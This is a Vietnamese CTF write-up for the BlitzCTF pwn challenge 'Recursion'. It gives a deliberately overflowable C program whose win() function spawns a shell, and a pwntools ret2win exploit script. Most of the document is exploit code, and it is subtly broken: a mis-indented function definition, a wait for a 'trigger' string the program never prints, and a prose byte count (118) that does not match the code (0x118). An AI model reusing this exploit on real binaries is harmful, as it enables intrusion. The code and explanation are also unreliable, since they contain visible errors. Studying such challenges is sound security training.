## BlitzCTF 

1.Recursion 

Source code : 
``` 
//  gcc chall.c -o chall -fno-stack-protector -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void win() {
    printf("You win!\n");
    system("/bin/sh");
}

int main() {
    char buf[0x100];

    ssize_t n = read(0, buf, sizeof(buf) + 0x18);
    puts(buf);

    if (buf[n - 1] != '\n')
        return main();

    return 0;
}
```
Sau khi đọc source code của chall này ta thấy được đơn cử đây là 1 bài ret2win, chúng ta cần phải leak được address và call được hàm win() để nhận được flag. 
Logic code sẽ là chương trình đọc 118 bytes từ đầu vào, và nếu ký tự cuối cùng không phải là ký tự xuống dòng, nó sẽ gọi lại main(). Điều này tạo ra một vòng lặp và luôn quay lại main(), mỗi lần gọi lại main(), stack sẽ bị trừ đi 0x110 bytes và rồi tạo ra 1 stack frame mới với nhiều địa chỉ nhạy cảm. 
Vậy thì với exploit, ta cần leak được địa chỉ stack address cũng như là ngoài ra phải thực hiện thao tác debug trong dockerfile để tìm offset chính xác giữa leaked stack address và stack address nơi được viết hàm win ở trong đấy :  
```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *


context.log_level = 'debug'
context.arch = 'amd64'  
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc


gdbscript = '''
init-pwndbg
break *0x4011CC
continue
'''

def start(argv=[]):
    if args.REMOTE:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        p = process([exe.path] + argv)
        gdb.attach(p, gdbscript=gdbscript)
        return p
    else:
        return process([exe.path] + argv, aslr=True)

# ==================== EXPLOIT ====================
    def exploit():
    p = start()

    
    p.sendline(cyclic(0x30))  
    p.recvuntil(b'trigger\n')  
    leak = p.recvline()
    
   
    stack_leak = u64(leak[:8].ljust(8, b'\0'))
    log.success(f'Stack leak: {hex(stack_leak)}')

   
    offset = cyclic_find(leak[:8])  
    log.info(f'Offset to return address: {offset}')

  
    payload = flat(
        b'A' * offset,          
        p64(exe.sym.win),       
        b'\0' * (0x100 - offset - 8)  
    )

    
    p.sendline(payload)
    p.sendline(b'trigger')

    # Interact with the shell
    p.interactive()

if __name__ == '__main__':
    exploit()
```
